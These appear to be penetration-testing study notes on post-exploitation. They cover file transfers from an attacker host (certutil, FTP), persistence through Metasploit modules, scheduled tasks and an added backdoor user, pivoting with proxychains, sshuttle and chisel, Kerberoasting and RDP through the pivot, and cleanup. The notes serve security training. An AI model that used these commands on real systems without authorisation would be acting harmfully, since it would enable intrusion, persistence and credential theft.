

#### File Transfers Review:

- Certutil (Windows)
	- `certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt`
- HTTP
	- `python -m SimpleHTTPServer 80`
- Browser
	- Navigate directly to file
- FTP
	- `python -m pyftpdlib 21` (Attacker machine)
	- `ftp {attacker-ip-address}` (Target machine)
- Linux
	- wget
- Metasploit - this has a upload and download feature, if we have the meterpreter shell open


#### Maintaining Access Overview:

- Persistence Scripts:
	- run persistence -h
	- exploit/windows/local/persistence
	- exploit/windows/local/registry_persistence
- Scheduled tasks:
	- run scheduleme
	- run schtaskabuse
- Add a user
	- net user hacker password123 /add


#### Pivoting Overview:

If a machine is compromised and that machine is linked to 2 NIC's, one which we don't have a access to {we can find the ip-address using the `ip a` command in the compromised machine, we can use the compromised machine as a proxy to pivot us to the another network interface, which we don't have access in the first place. This process is called pivoting.

**Tool: proxychains**
- Step 1:
	- We need to find the port used in the proxy chains tool using the cat command of the proxy chains conf file
		- `cat /etc/proxychains4.conf` or `cat /etc/proxychains.conf`
	- In the conf file, find the socks4 at the end of the file, which has the local-host ip address and a port as `9050`, or it can be anything. We can use that port for the proxy
- Step 2:
	- We are going to ssh to the target machine, which has the access to the other NIC
		- `ssh -f -N -D 9050 -i pivot root@10.10.155.5{Target_IP_Address`
			- -f - this is mentioning the SSH to run in background
			- -N this is for port forwarding
			- -D - this is to bind the port 
- Step 3:
	- We can run nmap through proxychains.
		- `proxychains nnamp -p88 10.10.10.255`{ip-address of the other NIC}
			- this is to scan nmap specific to port 88
		- `proxychains nmap 10.10.10.255 -sT`
			- this is to scan  all the open ports with TCP connect scan, instead of SYN scan with the `-sT`
- Step 4:
	- We can run attacks as well using proxychains with no issue, below is for Kerberos attack
		- `proxychains GetUserSPNs.py {domain}.local/{username}:{Password} -dc-ip {target_ip_address} -request`
- Step 5:
	- We can also RDP to the machine using the below command/ xfreerdp tool.
		- `proxychains xfreerdp /u:administrator /p:'Hacker321!' /v:10.10.10.255`
- Step 6:
	- We can also open firefox through proxychains, which pivots the traffic from firefox to the  target machine (Make sure to close the firefox, if you have it open already)
		- `proxychains firefox`
	- This is useful to access any webpages that are hosted on the target machine, which we can't access earlier

**Tool: sshuttle**
If we don't have this tool installed, we can use `sudo pip install sshuttle` to install the tool into the machine

Syntax:
- `sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot"`


**Tool: chisel**
Another tool we can use for proxy, we can find it with searching google with `chisel github`


#### Cleaning Up:

Make the system/network as it was when you entered it
- Remove executables scripts and added files
- Remove malware, rootkits and added user accounts
- Set settings back to original configurations

